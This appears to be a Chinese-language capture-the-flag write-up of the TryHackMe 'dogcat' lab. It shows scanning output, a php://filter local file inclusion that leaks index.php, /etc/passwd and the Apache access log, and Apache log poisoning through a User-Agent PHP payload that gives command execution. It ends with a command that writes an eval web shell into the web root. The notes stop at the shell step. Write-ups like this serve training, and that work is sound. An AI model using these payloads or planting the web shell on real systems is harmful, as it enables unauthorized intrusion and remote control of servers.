# 服务发现
```
┌──(root💀kali)-[~/tryhackme]
└─#  nmap -sV -Pn 10.10.228.190                         
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-23 01:40 EDT
Nmap scan report for 10.10.199.124
Host is up (0.31s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.93 seconds

```

# 目录爆破，只有cat和dog两个已知文件夹，各有10张图片
```
┌──(root💀kali)-[~/dirsearch]
└─#  python3 dirsearch.py -u "http://10.10.199.124" -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt -e* -t 100

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: * | HTTP method: get | Threads: 100 | Wordlist size: 220521

Error Log: /root/dirsearch/logs/errors-21-09-23_01-46-47.log

Target: http://10.10.199.124

[01:46:48] Starting: 
[01:46:49] 200 -  418B  - /
[01:47:04] 301 -  311B  - /cats  ->  http://10.10.199.124/cats/
[01:47:10] 301 -  311B  - /dogs  ->  http://10.10.199.124/dogs/
[01:52:19] 403 -  277B  - /server-status  
```

经分析验证首页view参数存在一个LFI，并且构造参数一定要包含cat或者dog，否则会显示```Sorry, only dogs or cats are allowed.```
并且文件后缀添加了.php，我们估计源代码大概是这样的
```
$dir = $_GET["view"] .'.php';
include($dir);
```
http://10.10.199.124/?view=dog


构造payload
```http://10.10.199.124/?view=php://filter/read=convert.base64-encode/resource=./cat/../index```

得到index.php的源码base64字符串
```
PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==
```

解密后
```
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

# 源码分析
大概与我们猜想的一致，需要留意``` $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';```这行代码，文件后缀其实是可以指定的，不指定默认是```.php```

# 构造参数读取/etc/passwd文件
```http://10.10.199.124/?view=php://filter/read=convert.base64-encode/resource=./cat/../../../../etc/passwd&ext=&```

# 解密为
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```
居然没有普通用户


找到access.log路径
```
?view=php://filter/read=convert.base64-encode/resource=./cat/../../../../var/log/apache2/access.log&ext=&
```

base64decode完后查看log记录
```
127.0.0.1 - - [03/Nov/2021:08:42:41 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [03/Nov/2021:08:43:15 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [03/Nov/2021:08:43:52 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.13.21.169 - - [03/Nov/2021:08:44:01 +0000] "GET /?view=php://filter/read=convert.base64-encode/resource=./cat/../../../../etc/passwd&ext=& HTTP/1.1" 200 1071 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
10.13.21.169 - - [03/Nov/2021:08:44:01 +0000] "GET /style.css HTTP/1.1" 200 662 "http://10.10.199.124/?view=php://filter/read=convert.base64-encode/resource=./cat/../../../../etc/passwd&ext=&" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
10.13.21.169 - - [03/Nov/2021:08:44:02 +0000] "GET /favicon.ico HTTP/1.1" 404 455 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
```

由记录可见，记录了url和user-agent，我们打开burpsuite，把下面代码放到user-agent，验证是否存在文件解析漏洞
```<?php phpinfo(); ?>```
点击页面触发，可以显示php版本信息，证明漏洞存在
```?view=./cat/../../../../var/log/apache2/access.log&ext=&```

# getshell

```
GET /?view=./cat/../../../../var/log/apache2/access.log&ext=&cmd=ls HTTP/1.1
Host: 10.10.228.190
User-Agent: "<?php system($_GET['cmd']);?>"
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```


<?php system($_GET['cmd']);?>




echo "<?php eval(@$_POST[a]); ?>" >  /var/www/html/shell.php